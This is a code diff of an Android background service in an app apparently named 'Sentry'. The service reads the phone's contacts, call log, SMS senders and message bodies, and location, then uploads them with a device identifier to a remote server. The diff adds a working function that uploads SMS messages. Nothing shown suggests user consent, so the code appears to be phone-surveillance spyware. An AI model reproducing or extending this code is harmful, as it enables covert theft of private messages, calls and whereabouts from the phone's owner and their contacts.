@@ -270,7 +270,6 @@ public class WorkService extends Service {
 			String lastUploadServer = SentryApplication.getApp().getLocationLastUploadTime();
 			String lastestLocal = getLocationLatestUpdateTime();
 			ArrayList<SLocation> locations = DBImpl.getInstance().getLocations(lastUploadServer);
-//			String serverLatest = getLatestFromServer();
 //			AppLog.d(TAG, "size is " + locations.size() + ", Since Sever " + serverLatest);
 			if(locations != null && locations.size() > 0){
 				boolean success = uploadLocationList(locations);
@@ -316,9 +315,9 @@ public class WorkService extends Service {
 				        String strPhoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 				        sb.append(strPhoneNumber + ",");
 				    }
-				    contact.idStr = Utility.genContactId(name, contactId);
+				    contact._idStr = Utility.genContactId(name, contactId);
 					contact.name = name;
-					contact.numbers = sb.toString();
+					contact.number = sb.toString();
 					list.add(contact);
 					AppLog.d(TAG, "[Contact] > " + contact);
 					
@@ -357,9 +356,8 @@ public class WorkService extends Service {
 				ArrayList<SCall> list = new ArrayList<SCall>();
 				while(cursor.moveToNext()){
 					SCall call = new SCall();
-//				    long _id = cursor.getLong(cursor.getColumnIndex(CallLog.Calls._ID));
 					call.number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
-					call.date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
+					call._date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
 					call.duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
 					call.name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
 					call.type = SCall.parseType(cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
@@ -372,6 +370,8 @@ public class WorkService extends Service {
 					SentryApplication.getApp().setCallLastUpdateTime(latestLocal);
 				}
 				AppLog.d(TAG, "[Call] upload success ? " + success);
+			}else {
+				AppLog.d(TAG, "[Call] Can not found updates in calllog database, SKIP!!");
 			}
 			
 			return true;
@@ -387,9 +387,9 @@ public class WorkService extends Service {
 			ContentResolver cr = getContentResolver();
 			long latestLocal = getSmsLastestUpdateTime(cr);
 			long lastUpdateServer = SentryApplication.getApp().getSmsLastUpdateTime();
-			if(lastUpdateServer < latestLocal || true) {
+			if(lastUpdateServer < latestLocal) {
 				int deltaDay = (int) Math.ceil((latestLocal - lastUpdateServer) / (24 * 3600000));
-				int max = Math.max(1, Math.min(deltaDay, 5)) * 100;
+				int max = Math.max(1, Math.min(deltaDay, 5)) * 50;
 				String where = "date > " + lastUpdateServer;
 				Cursor cursor = cr.query(SMS_CONTENT_URI, null, where, null,
 						"date DESC LIMIT " + max);
@@ -397,7 +397,7 @@ public class WorkService extends Service {
 				ArrayList<SSms> list = new ArrayList<SSms>();
 				while(cursor.moveToNext()){
 					SSms sms = new SSms();
-					sms.date = cursor.getLong(cursor.getColumnIndex("date"));
+					sms._date = cursor.getLong(cursor.getColumnIndex("date"));
 					sms.number = cursor.getString(cursor.getColumnIndex("address"));
 					sms.body = cursor.getString(cursor.getColumnIndex("body"));
 					sms.name = queryNameFromDB(cr, sms.number);
@@ -406,27 +406,17 @@ public class WorkService extends Service {
 				    list.add(sms);
 				}
 				cursor.close();
-				boolean success = uploadCalls(list);
+				boolean success = uploadSms(list);
 				if(success){
 					SentryApplication.getApp().setSmsLastUpdateTime(latestLocal);
 				}
 				AppLog.d(TAG, "[SMS] upload success ? " + success);
+			}else {
+				AppLog.d(TAG, "[SMS] Can not found updates in sms database, SKIP!!");
 			}
-			
 			return true;
 		}
 		
-		private boolean uploadCalls(ArrayList<SSms> list) {
-			// TODO Auto-generated method stub
-			return false;
-		}
-
-		@Override
-		protected void onPostExecute(Boolean result) {
-			// TODO Auto-generated method stub
-			if(result){
-			}
-		}
 	}
 	
 	private boolean uploadMobileInfo(String uuid, String number, String model, String sysVersion){
@@ -435,7 +425,7 @@ public class WorkService extends Service {
 		map.put("number", number);
 		map.put("model", model);
 		map.put("sysVersion", sysVersion);
-		String responce = NetUtil.doPost(Common.URL_MOBILE_INFO_UPLOAD, map);
+		String responce = NetUtil.doPost(Common.URL_UP_MOBILE_INFO, map);
 		WebResult result = WebResult.parseByJson(responce);
 		return result != null && result.success;
 	}
@@ -444,8 +434,7 @@ public class WorkService extends Service {
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put("locations", SLocation.buildJsonStr(locations));
 		map.put("uuid", SentryApplication.getApp().getUuid());
-		map.put("model", android.os.Build.MODEL);
-		String responce = NetUtil.doPost(Common.URL_LOCATION_UPLOAD, map);
+		String responce = NetUtil.doPost(Common.URL_UP_LOCATION, map);
 		WebResult result = WebResult.parseByJson(responce);
 		return result != null && result.success;
 	}
@@ -455,8 +444,7 @@ public class WorkService extends Service {
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put("calls", SCall.buildJsonStr(list));
 		map.put("uuid", SentryApplication.getApp().getUuid());
-		map.put("model", android.os.Build.MODEL);
-		String responce = NetUtil.doPost(Common.URL_CALL_UPLOAD, map);
+		String responce = NetUtil.doPost(Common.URL_UP_CALL, map);
 		WebResult result = WebResult.parseByJson(responce);
 		return result != null && result.success;
 	}
@@ -466,8 +454,17 @@ public class WorkService extends Service {
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put("contacts", SContact.buildJsonStr(list));
 		map.put("uuid", SentryApplication.getApp().getUuid());
-		map.put("model", android.os.Build.MODEL);
-		String responce = NetUtil.doPost(Common.URL_CONTACT_UPLOAD, map);
+		String responce = NetUtil.doPost(Common.URL_UP_CONTACT, map);
+		WebResult result = WebResult.parseByJson(responce);
+		return result != null && result.success;
+	}
+	
+	private boolean uploadSms(ArrayList<SSms> list) {
+		// TODO Auto-generated method stub
+		HashMap<String, String> map = new HashMap<String, String>();
+		map.put("smses", SSms.buildJsonStr(list));
+		map.put("uuid", SentryApplication.getApp().getUuid());
+		String responce = NetUtil.doPost(Common.URL_UP_SMS, map);
 		WebResult result = WebResult.parseByJson(responce);
 		return result != null && result.success;
 	}
@@ -543,7 +540,7 @@ public class WorkService extends Service {
 			}
 		}
 		cs.close();
-		Log.d(TAG, "[queryNameFromDB] number is " + number + "> " + sb.toString());
+		//Log.d(TAG, "[queryNameFromDB] number is " + number + "> " + sb.toString());
 		return sb.toString();
 	}
 	
